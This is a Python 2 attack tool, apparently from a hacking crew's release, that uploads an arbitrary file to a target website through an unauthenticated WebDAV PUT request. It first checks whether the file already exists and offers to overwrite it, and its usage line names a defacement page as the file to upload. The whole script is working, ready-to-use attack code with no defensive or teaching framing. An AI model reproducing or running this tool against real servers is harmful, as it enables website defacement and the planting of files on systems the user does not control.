#!/usr/bin/python

import requests
import string
import random
import sys
import os

os.system("clear")

print """
 __      __      ___.   ________      _________   ____
/  \    /  \ ____\_ |__ \______ \    /  _  \   \ /   /
\   \/\/   // __ \| __ \ |    |  \  /  /_\  \   Y   / 
 \        /\  ___/| \_\ \|    `   \/    |    \     /  
  \__/\  /  \___  >___  /_______  /\____|__  /\___/   
       \/       \/    \/        \/         \/         """

def webdav():
  sc = ''
  with open(sys.argv[2], 'rb') as f:
      depes = f.read()
  script = depes
  host = sys.argv[1]
  if not host.startswith('http'):
    host = 'http://' + host
  nama = '/'+sys.argv[2]


  print("[*] Upload File Nama : %s") % (sys.argv[2])
  print("[*] Uploading %d bytes, Script Baru") % len(script)

  r = requests.request('put', host + nama, data=script, headers={'Content-Type':'application/octet-stream'})

  if r.status_code < 200 or r.status_code >= 300:
    print("[!] Upload failed . . .")
    sys.exit(1)
  else:
    print("[+] File uploaded . . .")
    print("[+] PATH : "+host + nama)


def cekfile():
 print("""
[*] WebDAV File Upload Exploiter
[*] Coded To Python By AndroSec1337 Cyber Team
[*] Thx To Tu5b0l3d IndoXploit For PHP Exploit
""")
 print("[*] Cek File Di Target : "+sys.argv[1]+"/"+sys.argv[2])
 r = requests.get(sys.argv[1] +"/"+ sys.argv[2])
 if r.status_code == requests.codes.ok:
  print("[*] Di Temukan File Yg Sama Di Target . . .")
  tanya = raw_input("[!] Replace File Target ? [Y/N] > ")
  if tanya == "Y":
   webdav()
  else:
   print("[!] Exiting Tools . . .")
   sys.exit()
 else:
   print("[*] File Ga Di Target . . .")
   print("[*] Proses Upload Script lu . . .")
   webdav()


if __name__ == '__main__':
  if len(sys.argv) != 3:
    print("\n[*] Usage: "+sys.argv[0]+" Target.com ScriptDeface.htm\n")
    sys.exit(0)
  else:
    cekfile()